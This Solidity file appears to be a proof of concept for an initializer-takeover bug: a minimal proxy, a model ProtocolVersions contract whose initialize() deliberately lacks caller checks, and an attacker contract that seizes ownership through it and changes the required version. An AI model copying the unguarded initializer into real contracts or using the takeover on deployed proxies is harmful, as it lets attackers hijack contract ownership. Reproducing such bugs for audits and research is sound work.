// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IProtocolVersionsLike {
    function initialize(address owner_, uint256 required_, uint256 recommended_) external;
    function owner() external view returns (address);
    function required() external view returns (uint256);
    function recommended() external view returns (uint256);
    function setRequired(uint256 required_) external;
    function setRecommended(uint256 recommended_) external;
}

/// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
contract OptimismF1SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT =
        bytes32(uint256(keccak256("optimism.f1.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("optimism.f1.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            sstore(adminSlot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            admin_ := sload(adminSlot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(implementationSlot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice ProtocolVersions model preserving bug parity:
///         `initialize(...)` has no caller authorization guard.
contract ProtocolVersionsLike {
    bool internal initialized;
    address internal _owner;
    uint256 internal _required;
    uint256 internal _recommended;

    error AlreadyInitialized();
    error Unauthorized();
    error InvalidOwner();

    constructor() {
        // Bug parity with _disableInitializers on implementation deployment.
        initialized = true;
    }

    function initialize(address owner_, uint256 required_, uint256 recommended_) external {
        if (initialized) revert AlreadyInitialized();
        if (owner_ == address(0)) revert InvalidOwner();
        initialized = true;
        _owner = owner_;
        _required = required_;
        _recommended = recommended_;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function required() external view returns (uint256) {
        return _required;
    }

    function recommended() external view returns (uint256) {
        return _recommended;
    }

    function setRequired(uint256 required_) external {
        if (msg.sender != _owner) revert Unauthorized();
        _required = required_;
    }

    function setRecommended(uint256 recommended_) external {
        if (msg.sender != _owner) revert Unauthorized();
        _recommended = recommended_;
    }
}

/// @notice Helper that performs first-caller initializer takeover.
contract ProtocolVersionsInitAttacker {
    function hijack(address proxy, address attackerOwner, uint256 required_, uint256 recommended_) external {
        IProtocolVersionsLike(proxy).initialize(attackerOwner, required_, recommended_);
    }

    function mutateRequired(address proxy, uint256 required_) external {
        IProtocolVersionsLike(proxy).setRequired(required_);
    }
}
